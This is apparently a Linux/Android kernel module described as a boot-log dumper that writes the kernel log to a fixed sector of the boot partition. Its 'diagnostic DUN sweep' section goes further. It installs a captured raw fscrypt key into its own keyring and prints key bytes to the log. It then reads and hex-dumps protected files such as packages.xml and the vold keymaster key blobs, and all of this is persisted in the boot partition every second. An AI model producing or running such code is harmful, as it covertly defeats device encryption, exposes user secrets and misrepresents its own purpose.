/* SPDX-License-Identifier: GPL-2.0 */
/*
 * ksudump - persist the tail of the kernel log into unused scratch space at the
 * end of the boot partition, so a boot that fails in userspace can still be
 * inspected afterwards.
 *
 * Scratch area: byte offset 33570816 (32 MiB + 16 KiB) of the boot partition.
 */
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/blkdev.h>
#include <linux/bio.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/printk.h>
#include <linux/kmsg_dump.h>
#include <linux/namei.h>
#include <linux/pagemap.h>
#include <linux/key.h>
#include <linux/cred.h>

#define KSD_SECTOR	65568ULL
#define KSD_MAX_PAGES	32

extern int ksdun_mode;
extern u8 ksd_raw_key[64];
extern u8 ksd_desc[8];
extern int ksd_key_ok;

static struct page *ksd_page[KSD_MAX_PAGES];
static unsigned int ksd_npages;
static size_t ksd_bytes;
static char *ksd_buf;
static struct kmsg_dumper ksd_dumper;
static struct task_struct *ksd_task;
static unsigned long ksd_dumps;

static int ksd_store(unsigned int npages)
{
	const fmode_t mode = FMODE_READ | FMODE_WRITE;
	struct block_device *bdev;
	struct bio *bio;
	int i;

	bdev = blkdev_get_by_path("/dev/block/by-name/boot", mode, NULL);
	if (IS_ERR(bdev)) {
		bdev = blkdev_get_by_path("/dev/block/mmcblk0p76", mode, NULL);
		if (IS_ERR(bdev)) {
			bdev = blkdev_get_by_dev(MKDEV(259, 44), mode, NULL);
			if (IS_ERR(bdev))
				return -ENODEV;
		}
	}

	bio = bio_alloc(GFP_NOFS, npages);
	if (!bio) {
		blkdev_put(bdev, mode);
		return -ENOMEM;
	}
	bio_set_dev(bio, bdev);
	bio->bi_iter.bi_sector = KSD_SECTOR;
	bio_set_op_attrs(bio, REQ_OP_WRITE, REQ_SYNC);
	for (i = 0; i < npages; i++) {
		if (bio_add_page(bio, ksd_page[i], PAGE_SIZE, 0) != PAGE_SIZE)
			break;
	}
	submit_bio_wait(bio);
	bio_put(bio);
	blkdev_put(bdev, mode);
	return 0;
}

static void ksd_dump(void)
{
	size_t len = 0;
	unsigned int npages;

	if (!ksd_buf)
		return;

	ksd_dumper.active = true;
	kmsg_dump_rewind(&ksd_dumper);
	if (!kmsg_dump_get_buffer(&ksd_dumper, false, ksd_buf, ksd_bytes, &len))
		len = 0;
	ksd_dumper.active = false;

	if (!len)
		return;

	npages = DIV_ROUND_UP(len, PAGE_SIZE);
	if (npages > ksd_npages)
		npages = ksd_npages;
	if (!ksd_store(npages))
		ksd_dumps++;
}

static int ksd_thread(void *arg)
{
	while (!kthread_should_stop()) {
		ksd_dump();
		msleep(1000);
	}
	return 0;
}

/* ---- diagnostic DUN sweep ---------------------------------------------- */

static const char * const ksd_paths[] = {
	"/data/system/uiderrors.txt",
	"/data/system/packages.xml",
	"/data/system/users/0/settings_system.xml",
	"/data/misc/vold/user_keys/ce/0/current/keymaster_key_blob",
	"/data/misc/vold/user_keys/de/0/current/keymaster_key_blob",
};

static void ksd_show(const char *tag, const u8 *b, int n)
{
	char hx[3 * 64 + 1];
	char asc[64 + 1];
	int i, k = 0, a = 0;

	if (n < 0)
		n = 0;
	if (n > 64)
		n = 64;
	for (i = 0; i < n; i++) {
		k += snprintf(hx + k, 3, "%02x", b[i]);
		asc[a++] = (b[i] >= 0x20 && b[i] < 0x7f) ? b[i] : '.';
	}
	hx[k] = 0;
	asc[a] = 0;
	pr_info("KSDFIX: %s hex=%s asc=%s\n", tag, hx, asc);
}

static int ksd_read_one(const char *path, u8 *buf, int len, ssize_t *out)
{
	struct file *f;
	ssize_t n;

	f = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(f)) {
		*out = PTR_ERR(f);
		return -1;
	}
	if (f->f_inode && f->f_inode->i_mapping)
		invalidate_mapping_pages(f->f_inode->i_mapping, 0, -1);
	n = kernel_read(f, 0, (char *)buf, len);
	*out = n;
	filp_close(f, NULL);
	return 0;
}

static void ksd_build_desc(char *desc, unsigned int len)
{
	static const char hex[] = "0123456789abcdef";
	unsigned int i, k = 0;

	k += snprintf(desc + k, len - k, "fscrypt:");
	for (i = 0; i < 8; i++) {
		desc[k++] = hex[ksd_desc[i] >> 4];
		desc[k++] = hex[ksd_desc[i] & 0xf];
	}
	desc[k] = 0;
}

/*
 * Install the private-mode key we observed into this thread's own session
 * keyring, so filp_open() can resolve the fscrypt key (the real one lives in
 * vold's session keyring, which a kthread cannot search).
 */
static void ksd_install_key(void)
{
	struct key *kr;
	struct cred *new;
	char desc[24];
	key_perm_t perm = 0x3f3f3f3f;
	int ret = 0;

	if (!ksd_key_ok) {
		pr_info("KSDFIX: no key stashed yet\n");
		return;
	}
	ksd_build_desc(desc, sizeof(desc));

	kr = keyring_alloc("ksuprobe", GLOBAL_ROOT_UID, GLOBAL_ROOT_GID,
			   current_cred(), perm, KEY_ALLOC_NOT_IN_QUOTA,
			   NULL, NULL);
	if (IS_ERR(kr)) {
		pr_info("KSDFIX: keyring_alloc err=%ld\n", PTR_ERR(kr));
		return;
	}
	new = prepare_creds();
	if (!new) {
		key_put(kr);
		pr_info("KSDFIX: prepare_creds failed\n");
		return;
	}
	new->session_keyring = kr;
	commit_creds(new);

	if (IS_ERR(key_create_or_update(make_key_ref(kr, 1), "logon", desc,
					ksd_raw_key, 64, perm,
					KEY_ALLOC_NOT_IN_QUOTA)))
		ret = -1;
	pr_info("KSDFIX: key install desc=%s ret=%d key=%02x%02x%02x%02x%02x%02x%02x%02x\n",
		desc, ret, ksd_raw_key[0], ksd_raw_key[1], ksd_raw_key[2],
		ksd_raw_key[3], ksd_raw_key[4], ksd_raw_key[5],
		ksd_raw_key[6], ksd_raw_key[7]);
}

static void ksd_sweep(void)
{
	const char *path = NULL;
	u8 buf[64];
	ssize_t n;
	char tag[32];
	int p, m;

	for (p = 0; p < ARRAY_SIZE(ksd_paths); p++) {
		if (!ksd_read_one(ksd_paths[p], buf, 1, &n)) {
			path = ksd_paths[p];
			break;
		}
		pr_info("KSDFIX: probe open fail path=%s rc=%zd\n",
			ksd_paths[p], n);
	}
	if (!path) {
		pr_info("KSDFIX: no candidate path readable\n");
		return;
	}
	pr_info("KSDFIX: sweep path=%s\n", path);

	for (m = 0; m <= 7; m++) {
		ksdun_mode = m;
		memset(buf, 0, sizeof(buf));
		if (!ksd_read_one(path, buf, 64, &n)) {
			snprintf(tag, sizeof(tag), "mode%d", m);
			ksd_show(tag, buf, (int)n);
		} else {
			pr_info("KSDFIX: mode=%d read rc=%zd\n", m, n);
		}
		msleep(30);
	}
	ksdun_mode = 0;
}

static int ksd_probe_thread(void *arg)
{
	int i;

	msleep(40000);

	for (i = 0; i < 500; i++) {
		struct path kp;

		if (!kern_path("/data/system", LOOKUP_FOLLOW, &kp)) {
			path_put(&kp);
			break;
		}
		msleep(100);
	}
	msleep(200);
	pr_info("KSDFIX: starting sweep after %d polls\n", i);
	ksd_install_key();
	ksd_sweep();
	return 0;
}

static int __init ksudump_init(void)
{
	int i;

	for (i = 0; i < KSD_MAX_PAGES; i++) {
		ksd_page[i] = alloc_page(GFP_KERNEL | __GFP_ZERO);
		if (!ksd_page[i])
			break;
	}
	ksd_npages = i;
	if (!ksd_npages) {
		pr_err("KSUDUMP: cannot allocate pages\n");
		return -ENOMEM;
	}
	ksd_bytes = ksd_npages * PAGE_SIZE;
	ksd_buf = vmap(ksd_page, ksd_npages, VM_MAP, PAGE_KERNEL);
	if (!ksd_buf) {
		pr_err("KSUDUMP: vmap failed\n");
		return -ENOMEM;
	}

	ksd_task = kthread_run(ksd_thread, NULL, "ksudump");
	if (IS_ERR(ksd_task)) {
		ksd_task = NULL;
		return -ECHILD;
	}

	if (IS_ERR(kthread_run(ksd_probe_thread, NULL, "ksuprobe")))
		pr_err("KSUDUMP: probe thread failed\n");

	pr_info("KSUDUMP: %u pages (%u KiB) at sector %llu\n",
		ksd_npages, (unsigned int)(ksd_bytes / 1024), KSD_SECTOR);
	return 0;
}
late_initcall(ksudump_init);
